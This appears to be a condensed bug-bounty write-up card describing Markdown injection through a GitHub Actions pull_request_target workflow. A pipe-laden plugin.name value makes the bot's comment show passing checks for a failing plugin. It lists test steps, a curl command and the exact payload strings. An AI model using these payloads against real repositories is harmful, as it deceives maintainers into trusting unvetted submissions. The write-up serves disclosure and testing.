---
id: 336ceaaf54aa
title: "Five Green Checkmarks I Typed Myself: Making GitHub's Own Bot Vouch for a Failing Plugin"
source_url: https://medium.com/@_marwankhodair_/five-green-checkmarks-i-typed-myself-making-githubs-own-bot-vouch-for-a-failing-plugin-49285c1adfb1
author: "_marwankhodair_"
publication_date: 2026-08-17
category: injection
category_label: "Injection (SQL / NoSQL)"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "cybersecurity"
  - "github"
  - "bug-bounty"
  - "penetration-testing"
  - "github-copilot"
tools:
  - "curl"
quick_test: "Test for Markdown injection in GitHub Actions workflows triggered by pull_request_target using controlled input fields."
---

## Use case

The vulnerability exists in the GitHub Actions workflow triggered by pull_request_target, allowing an attacker to inject Markdown into a bot comment that misrepresents the status of a plugin submission. This can mislead maintainers into trusting malicious submissions.

## Steps to test

1. Fork the repository containing the GitHub Actions workflow.
2. Create a JSON file at plugins/external.json with a controlled 'plugin.name' field.
3. Inject a payload into 'plugin.name' that includes pipe characters to manipulate the Markdown table structure.
4. Open a pull request to trigger the pull_request_target workflow.
5. Observe the bot's comment to see if the injected payload alters the displayed results.

## Commands

```text
curl -X POST -H 'Authorization: token YOUR_GITHUB_TOKEN' -d '{"name": "malicious-plugin | ✅ | ✅ | ✅ | ✅ | ✅ |"}' https://api.github.com/repos/YOUR_USERNAME/YOUR_REPO/pulls
on: pull_request_target
my fork's plugins/external.json
|
plugin.name         <- I fully control this string
|
detect-changed-plugins    <- reads it from the PR HEAD
|
run-quality-gates         <- passes the object along, unmodified
|
sync-pr-state             <- permissions: pull-requests: write + issues: write
|
github-actions[bot] posts a comment containing my string
`| ${entry.name} | ${entry.quality.vally_lint_status} | ${entry.quality.smoke_status} | ...`
"name": "[BBP-PoC: Markdown Injection via plugin.name](https://github.com/marwankhodair/bbp-test-01) **SECURITY RESEARCH**"
"name": "bbp-test-plugin | ✅ | ✅ | ✅ | ✅ | ✅ |"
| bbp-test-plugin | ✅ | ✅ | ✅ | ✅ | ✅ | | fail | fail | infra_error | not_run | infra_error | [sha] |
Plugin           | vally lint | install smoke | version match | canvas | overall
-----------------+------------+---------------+---------------+--------+---------
bbp-test-plugin  |     ✅     |      ✅       |      ✅       |   ✅   |   ✅
Plugin           | vally lint | install smoke | version match | canvas  | overall
-----------------+------------+---------------+---------------+---------+-------------
bbp-test-plugin  |    fail    |     fail      |  infra_error  | not_run | infra_error
```

## Source

- Author: _marwankhodair_
- Writeup: https://medium.com/@_marwankhodair_/five-green-checkmarks-i-typed-myself-making-githubs-own-bot-vouch-for-a-failing-plugin-49285c1adfb1

_For authorized testing only. Credit the original author._
